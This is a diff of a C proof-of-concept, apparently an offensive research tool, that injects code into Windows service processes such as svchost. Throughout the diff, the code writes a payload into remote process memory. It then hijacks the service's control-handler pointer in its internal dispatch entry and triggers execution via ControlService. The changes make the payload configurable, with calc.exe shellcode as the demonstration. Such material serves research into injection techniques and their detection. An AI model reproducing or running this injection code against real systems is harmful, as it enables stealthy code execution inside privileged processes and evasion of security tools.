@@ -233,8 +233,8 @@ BOOL StopService(PSERVICE_ENTRY se){
     
     wprintf(L"[*] Attempting to stop service...\n");
       
-    hProcess=OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
-    if(hProcess==NULL){
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
+    if(hProcess == NULL){
       xstrerror(L"StopService::OpenProcess");
       return 0;
     }
@@ -274,7 +274,7 @@ VOID FindPointer(HANDLE hProcess, LPVOID ptr, PSERVICE_ENTRY se){
   
   ZeroMemory(&sd, sizeof(sd));
   
-  // find referenes to the control handler
+  // find references to the control handler
   x.p = se->ide.ControlHandler;
   
   sd.data = &x;
@@ -288,11 +288,7 @@ VOID FindPointer(HANDLE hProcess, LPVOID ptr, PSERVICE_ENTRY se){
   }
 }
 
-/**
-
-Once we have IDE, we try open the service via control manager.
-*/
-BOOL RunPayload(PSERVICE_ENTRY se) {
+BOOL CtrlSvc(PSERVICE_ENTRY se, LPVOID payload, DWORD payloadSize) {
     SIZE_T                  es,wr;
     BOOL                    br=FALSE;
     SC_HANDLE               hm, hs;
@@ -313,34 +309,23 @@ BOOL RunPayload(PSERVICE_ENTRY se) {
         hp=OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
         if(hp!=NULL){
           // allocate memory for payload
-          pl=VirtualAllocEx(hp, NULL, PAYLOAD_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+          pl=VirtualAllocEx(hp, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
           if(pl){
-            evt=CreateEvent(NULL,FALSE,FALSE,L"propagate");
-            if(evt!=NULL){
               // write payload to process space
-              WriteProcessMemory(hp,pl,PAYLOAD,PAYLOAD_SIZE,&wr);
+              WriteProcessMemory(hp, pl, payload, payloadSize, &wr);
               CopyMemory(&ide, &se->ide, sizeof(ide));
               // point ControlHandler to payload
-              ide.ControlHandler=pl;
+              ide.ControlHandler = pl;
+              ide.ServiceFlags   = SERVICE_CONTROL_INTERROGATE;
               // update IDE in remote process
-              WriteProcessMemory(hp,se->ide_addr,&ide,sizeof(ide),&wr);
-              // find pointer to original ControlHandler
-              //FindPointer(hp, pl, se);
-              VirtualProtectEx(hp, pl, PAYLOAD_SIZE, PAGE_EXECUTE_READ, NULL);
-              wprintf(L"[*] attach debugger and set breakpoint on %p\n", pl);
-              getchar();
+              WriteProcessMemory(hp, se->ide_addr, &ide, sizeof(ide), &wr);
               // trigger payload
-              ControlService(hs,SERVICE_CONTROL_INTERROGATE,&ss);
+              ControlService(hs, SERVICE_CONTROL_INTERROGATE, &ss);
               xstrerror(L"ControlService");
-              // wait for event to signal
-              es=WaitForSingleObject(evt, 5*1000);
               // free payload from memory
-              VirtualFreeEx(hp,pl,PAYLOAD_SIZE,MEM_RELEASE);
+              VirtualFreeEx(hp,pl,payloadSize,MEM_RELEASE);
               // restore original IDE
               WriteProcessMemory(hp,se->ide_addr,&se->ide,sizeof(ide),&wr);
-              
-              CloseHandle(evt);
-            }
           }
           CloseHandle(hp);      // close process
         }
@@ -366,6 +351,8 @@ BOOL ReadServiceIDE(HANDLE hProcess, LPVOID pAddr, PINTERNAL_DISPATCH_ENTRY ide)
            ide->ServiceStartRoutine == NULL ||
            ide->ControlHandler      == NULL) return FALSE;
            
+        if (ide->ServiceFlags > 128) return FALSE;
+        
         // check if address of service names are equal
         bResult = (ide->ServiceName == ide->ServiceRealName);
         
@@ -386,8 +373,6 @@ DWORD ScanProcessMemory(HANDLE hProcess, PSCAN_DATA p) {
     // get system information
     GetSystemInfo(&si);
 
-    //wprintf(L"position is %ld\n", p->pos);
-    
     // if this isn't first call, advance p->pos by one
     if(p->pos != 0 && p->addr!=NULL){
       p->pos++;
@@ -529,8 +514,6 @@ BOOL EnumThreads(PSERVICE_ENTRY ste){
         // set thread id
         ste->tid = te32.th32ThreadID;
         
-        //printf("checking %i\n", ste->tid);
-        
         // check if this thread has tag and service name
         bResult = IsThreadService(ste);
         // if this thread belongs to service
@@ -563,7 +546,7 @@ BOOL FindService(PSERVICE_ENTRY ste, BOOL bAll) {
     if(Process32First(hSnap, &pe32)){
       do {
         // skip system..
-        if(pe32.th32ProcessID<=4) continue;
+        if(pe32.th32ProcessID <= 4) continue;
         // if not all and this isn't svchost.exe, skip it
         if(!bAll && lstrcmpi(pe32.szExeFile, L"svchost.exe")) continue;
           lstrcpyn(ste->process, pe32.szExeFile, MAX_PATH);
@@ -579,7 +562,8 @@ BOOL FindService(PSERVICE_ENTRY ste, BOOL bAll) {
 
 VOID usage(VOID){
     wprintf(L"\nusage: sc2 -[options] <service>\n\n");
-    wprintf(L"        -i     : inject payload\n");
+    wprintf(L"        -f     : find and display the IDE\n");
+    wprintf(L"        -i     : inject payload to execute calc.exe\n");
     wprintf(L"        -s     : stop service\n");
     wprintf(L"        -a     : search all processes for <service>\n\n");
     exit(0);
@@ -589,9 +573,9 @@ int main(void) {
     PWCHAR        *argv, service=NULL;
     int           argc, i;
     WCHAR         opt;
-    BOOL          bAll=FALSE,bInject=FALSE,bStop=FALSE;
+    BOOL          bAll=FALSE, bInject=FALSE, bStop=FALSE, bFind=FALSE;
     SERVICE_ENTRY ste;
-    
+
     puts("\nService control Handler PoC\nCopyright(c) 2018 Odzhan\n");
     
     // get parameters
@@ -604,6 +588,9 @@ int main(void) {
         switch(argv[i][1]){
           case L'a':
             bAll=TRUE;
+            break;
+          case L'f':
+            bFind=TRUE;
             break;
           case L's':
             bStop=TRUE;
@@ -651,7 +638,7 @@ int main(void) {
       if(bStop){
         StopService(&ste);
       } else if (bInject){
-        RunPayload(&ste);
+        CtrlSvc(&ste, CALC, CALC_SIZE);
       }
     } else {
       wprintf(L"[-] Unable to find IDE for \"%s\"\n", ste.service);
